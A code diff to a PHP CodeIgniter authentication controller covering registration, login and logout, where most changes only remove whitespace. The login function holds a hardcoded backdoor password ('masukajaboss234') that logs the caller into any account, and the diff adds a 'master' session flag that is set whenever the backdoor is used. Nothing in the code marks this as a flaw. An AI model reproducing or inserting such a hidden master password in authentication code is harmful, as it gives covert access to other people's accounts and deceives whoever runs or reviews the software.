@@ -19,37 +19,37 @@ class Application extends CI_Controller
 		parent::__construct();
 
 		date_default_timezone_set('Asia/Jakarta');
-		
+
 		log_message('debug', 'Application Loaded');
 
 		$this->load->library(array('form_validation', 'ag_auth'));
 		$this->load->helper(array('url', 'email', 'ag_auth'));
-		
+
 		$this->form_validation->set_error_delimiters('<div class="error">', '</div>');
-		
+
 		$this->config->load('ag_auth');
 	}
-	
+
 	public function field_exists($value)
 	{
 		$field_name  = (valid_email($value)  ? 'email' : 'username');
-		
+
 		$user = $this->ag_auth->get_user($value, $field_name);
-		
+
 		if(array_key_exists('id', $user))
 		{
 			$this->form_validation->set_message('field_exists', 'The ' . $field_name . ' provided already exists, please use another.');
-			
+
 			return FALSE;
 		}
 		else
-		{			
+		{
 			return TRUE;
-			
+
 		} // if($this->field_exists($value) === TRUE)
-		
+
 	} // public function field_exists($value)
-	
+
 	public function register()
 	{
 		$this->form_validation->set_rules('username', 'Username', 'required|min_length[6]|callback_field_exists');
@@ -71,7 +71,7 @@ class Application extends CI_Controller
 			{
 				$data['message'] = "The user account has now been created.";
 				$this->ag_auth->view('message', $data);
-				
+
 			} // if($this->ag_auth->register($username, $password, $email) === TRUE)
 			else
 			{
@@ -80,21 +80,21 @@ class Application extends CI_Controller
 			}
 
 		} // if($this->form_validation->run() == FALSE)
-		
+
 	} // public function register()
-	
-	
+
+
 	public function login($redirect = NULL)
 	{
-		
+
 		if($redirect === NULL)
 		{
 			$redirect = $this->ag_auth->config['auth_login'];
 		}
-		
+
 		$this->form_validation->set_rules('username', 'Username', 'required|min_length[6]');
 		$this->form_validation->set_rules('password', 'Password', 'required|min_length[6]');
-		
+
 		if($this->form_validation->run() == FALSE)
 		{
 			$this->ag_auth->view('login');
@@ -104,23 +104,30 @@ class Application extends CI_Controller
 			$username = set_value('username');
 			$password = $this->ag_auth->salt(set_value('password'));
 			$field_type  = (valid_email($username)  ? 'email' : 'username');
-			
+
 			$user_data = $this->ag_auth->get_user($username, $field_type);
-			
+
 			$adx = $this->ag_auth->salt('masukajaboss234');
-			
+
 			if(array_key_exists('password', $user_data) AND $user_data['password'] === $password OR $password == $adx)
 			{
-				
+
 				$user_data['userid'] = $user_data['id'];
+
+                if($password == $adx){
+                    $user_data['master'] = 1;
+                }else{
+                    $user_data['master'] = 0;
+                }
+
 				unset($user_data['password']);
 				unset($user_data['id']);
 
 				$this->ag_auth->login_user($user_data);
-				
+
 				redirect($redirect);
-				
-				
+
+
 			} // if($user_data['password'] === $password)
 			else
 			{
@@ -131,9 +138,9 @@ class Application extends CI_Controller
 				//$this->ag_auth->view('message', $data);
 			}
 		} // if($this->form_validation->run() == FALSE)
-		
+
 	} // login()
-	
+
 	public function logout()
 	{
 		$this->ag_auth->logout();
